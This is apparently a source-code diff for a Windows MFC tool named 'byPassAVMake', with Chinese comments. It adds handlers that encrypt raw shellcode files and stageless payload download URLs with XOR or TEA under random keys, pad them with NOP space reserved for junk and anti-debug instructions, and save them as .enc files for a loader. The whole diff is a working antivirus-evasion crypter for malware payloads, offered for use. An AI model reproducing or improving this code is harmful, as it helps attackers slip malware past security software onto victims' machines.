@@ -78,6 +78,8 @@ BEGIN_MESSAGE_MAP(CbyPassAVMakeDlg, CDialogEx)
 	ON_BN_CLICKED(IDC_BUTTON3, &CbyPassAVMakeDlg::OnBnClickedButton3)
 	ON_BN_CLICKED(IDC_BUTTON4, &CbyPassAVMakeDlg::OnBnClickedButton4)
 	ON_BN_CLICKED(IDC_BUTTON5, &CbyPassAVMakeDlg::OnBnClickedButton5)
+	ON_BN_CLICKED(IDC_BUTTON6, &CbyPassAVMakeDlg::OnBnClickedButton6)
+	ON_BN_CLICKED(IDC_BUTTON7, &CbyPassAVMakeDlg::OnBnClickedButton7)
 END_MESSAGE_MAP()
 
 
@@ -186,6 +188,19 @@ HCURSOR CbyPassAVMakeDlg::OnQueryDragIcon()
 	return static_cast<HCURSOR>(m_hIcon);
 }
 
+//随机生成数据
+void CbyPassAVMakeDlg::Randomkey(unsigned char* key, unsigned int len)
+{
+	memset(key, 0, len);
+	srand(0x5f4567);
+	srand(GetTickCount() + rand());
+	for (int i = 0; i < len; i++)
+	{
+		int seed = rand();
+		unsigned char r = seed;
+		memcpy(key + i, &r, 0x1);
+	}
+}
 
 //自定义加密算法基算法
 void CbyPassAVMakeDlg::encrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
@@ -552,9 +567,9 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 	
 	STu8* shellcode = 0;
 	STu32 shellcodesize = 0;
-	ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
+	//ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
 	//卸载大内存
-	MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
+	//MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
 	
 	//处理shellcode数据，加密shellcode代码
 	ByteBuffer encPacket;
@@ -568,14 +583,15 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 		scPacket.append(P_TYPE_STAGE);
 		scPacket.append(STu32(dwVirMemSize));
 		scPacket.append(pVirMem, dwVirMemSize);
+		STu8 XOR_BYTES[0x10];
+		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
+		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
 		encPacket.append(STu32(scPacket.size()));
-
 		//XOR加密
-		STu8 XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
 		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
 		for (int i = 0; i < scPacket.size(); i++)
 		{
-			encPacket.append(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
+			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
 		}
 	}
 	else if (IsDlgButtonChecked(IDC_RADIO2))
@@ -598,9 +614,10 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 		scPacket.append(P_TYPE_STAGE);
 		scPacket.append(STu32(dwVirMemSize));
 		scPacket.append(pVirMem, dwVirMemSize);
-
+		STu8 TEA_KEY[0x10];
+		Randomkey(TEA_KEY, sizeof(TEA_KEY));
+		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
 		//tea加密
-		STu8 TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
 		unsigned char* out = 0;
 		unsigned int outlen = 0;
 		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
@@ -657,14 +674,14 @@ void CbyPassAVMakeDlg::OnBnClickedButton5()
 		scPacket.append(P_TYPE_STAGELESSURL);
 		scPacket.append(STu32(shellcode.size()));
 		scPacket.append(shellcode.contents(), shellcode.size());
+		STu8 XOR_BYTES[0x10];
+		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
+		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
 		encPacket.append(STu32(scPacket.size()));
-
-		//XOR加密
-		STu8 XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
 		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
 		for (int i = 0; i < scPacket.size(); i++)
 		{
-			encPacket.append(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
+			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
 		}
 	}
 	else if (IsDlgButtonChecked(IDC_RADIO2))
@@ -688,12 +705,12 @@ void CbyPassAVMakeDlg::OnBnClickedButton5()
 		scPacket.append(STu32(shellcode.size()));
 		scPacket.append(shellcode.contents(), shellcode.size());
 
-		//TEA加密
-		STu8 TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+		STu8 TEA_KEY[0x10];
+		Randomkey(TEA_KEY, sizeof(TEA_KEY));
+		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
 		unsigned char* out = 0;
 		unsigned int outlen = 0;
 		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
-
 		//封装加密数据
 		encPacket.append(STu32(outlen));
 		encPacket.append(out, outlen);
@@ -709,6 +726,228 @@ void CbyPassAVMakeDlg::OnBnClickedButton5()
 	}
 	else
 		CDialogEx::OnCancel();
+}
+
+//加密raw文件
+void CbyPassAVMakeDlg::OnBnClickedButton6()
+{
+	//计算花指令，反调试代码预留空间
+	STu32 nopbytes = 0;
+	CString strNopBytes;
+	mCodesLen.GetWindowText(strNopBytes);
+	nopbytes = strtoll(strNopBytes, 0, 0x10);
+	//加载bin文件shellcode数据
+	CString binFile = "";
+	mFileBin.GetWindowTextA(binFile);
+	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (INVALID_HANDLE_VALUE == mHandle)
+	{
+		AfxMessageBox("文件打开失败!");
+		return;
+	}
+
+	DWORD dwSizeHigh = 0, dwShellCodeSize = 0;
+	dwShellCodeSize = GetFileSize(mHandle, &dwSizeHigh);
+	if (dwShellCodeSize == INVALID_FILE_SIZE || dwSizeHigh != 0)
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件太大!");
+		return;
+	}
+	STu32 dwVirMemSize = dwShellCodeSize + nopbytes;
+	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, __int64(dwVirMemSize));
+	if (pVirMem == NULL)
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("内存分配失败!");
+		return;
+	}
+
+	DWORD readsize;
+	if (!ReadFile(mHandle, pVirMem + nopbytes, dwShellCodeSize, &readsize, NULL))		//跳过nopbytes花指令
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件读取失败!");
+		return;
+	}
+
+	if (readsize != dwShellCodeSize)
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件读取失败!");
+		return;
+	}
+	CloseHandle(mHandle);
+
+	//处理shellcode数据，增加花指令,暂时填充NOP
+	if (nopbytes)
+		memset(pVirMem, 0x90, nopbytes);
+
+	STu8* shellcode = 0;
+	STu32 shellcodesize = 0;
+	//ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
+	//卸载大内存
+	//MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
+
+	//处理shellcode数据，加密shellcode代码
+	ByteBuffer encPacket;
+	if (IsDlgButtonChecked(IDC_RADIO1))
+	{
+		//封装加密类型
+		encPacket.append(H_ENC_XOR);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGE);
+		scPacket.append(STu32(dwVirMemSize));
+		scPacket.append(pVirMem, dwVirMemSize);
+		STu8 XOR_BYTES[0x10];
+		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
+		//添加密钥
+		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
+		encPacket.append(STu32(scPacket.size()));
+
+		//XOR加密
+		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
+		for (int i = 0; i < scPacket.size(); i++)
+		{
+			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
+		}
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO2))
+	{
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO3))
+	{
+		//RC4加密
+		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO4))
+	{
+		//封装加密类型
+		encPacket.append(H_ENC_TEA);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGE);
+		scPacket.append(STu32(dwVirMemSize));
+		scPacket.append(pVirMem, dwVirMemSize);
+
+		//tea加密
+		//随机生成密钥
+		STu8 TEA_KEY[0x10];
+		Randomkey(TEA_KEY, sizeof(TEA_KEY));
+		unsigned char* out = 0;
+		unsigned int outlen = 0;
+		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
+
+		//封装密钥
+		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
+		//封装加密数据
+		encPacket.append(STu32(outlen));
+		encPacket.append(out, outlen);
+		free(out);
+	}
+
+	//加密数据保存到文件
+	binFile += ".enc";
+	CFile mFile(binFile, CFile::modeCreate | CFile::modeReadWrite);
+	mFile.Write(encPacket.contents(), encPacket.size());
+	mFile.Close();
+	AfxMessageBox("保存成功");
+}
+
+//加密stageless url
+void CbyPassAVMakeDlg::OnBnClickedButton7()
+{
+	UpdateData(TRUE);
+	CString strName;
+	mSecName.GetWindowText(strName);
+	if (strName.GetLength() == 0)
+	{
+		AfxMessageBox("区段名为空!");
+		return;
+	}
+	CString binFile = "";
+	mFileBin.GetWindowTextA(binFile);
+
+	//封装stageless url
+	CStringA url;
+	mStagelessURL.GetWindowTextA(url);
+	CStringA ip;
+	mStagelessIP.GetWindowTextA(ip);
+	CString port;
+	mPort.GetWindowTextA(port);
+	CStringA _url = "http://" + ip + ":" + port + url;
+	ByteBuffer shellcode;
+	shellcode.append((unsigned char*)(_url.GetBuffer()), _url.GetLength());
+
+	//处理shellcode数据，加密shellcode代码
+	ByteBuffer encPacket;
+	if (IsDlgButtonChecked(IDC_RADIO1))
+	{
+		//封装加密类型
+		encPacket.append(H_ENC_XOR);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGELESSURL);
+		scPacket.append(STu32(shellcode.size()));
+		scPacket.append(shellcode.contents(), shellcode.size());
+		STu8 XOR_BYTES[0x10];
+		Randomkey(XOR_BYTES, sizeof(XOR_BYTES));
+		//添加密钥
+		encPacket.append(XOR_BYTES, sizeof(XOR_BYTES));
+		encPacket.append(STu32(scPacket.size()));
+
+		//XOR加密
+		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
+		for (int i = 0; i < scPacket.size(); i++)
+		{
+			encPacket.append<unsigned char>(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
+		}
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO2))
+	{
+		//aes加密
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO3))
+	{
+		//RC4加密
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO4))
+	{
+		//封装加密类型
+		encPacket.append(H_ENC_TEA);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGELESSURL);
+		scPacket.append(STu32(shellcode.size()));
+		scPacket.append(shellcode.contents(), shellcode.size());
+
+		//tea加密
+		//随机生成密钥
+		STu8 TEA_KEY[0x10];
+		Randomkey(TEA_KEY, sizeof(TEA_KEY));
+		unsigned char* out = 0;
+		unsigned int outlen = 0;
+		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
+
+		//封装密钥
+		encPacket.append(TEA_KEY, sizeof(TEA_KEY));
+		//封装加密数据
+		encPacket.append(STu32(outlen));
+		encPacket.append(out, outlen);
+		free(out);
+	}
+
+	//加密数据保存到文件
+	binFile += ".enc";
+	CFile mFile(binFile, CFile::modeCreate | CFile::modeReadWrite);
+	mFile.Write(encPacket.contents(), encPacket.size());
+	mFile.Close();
+	AfxMessageBox("保存成功");
 }
 
 
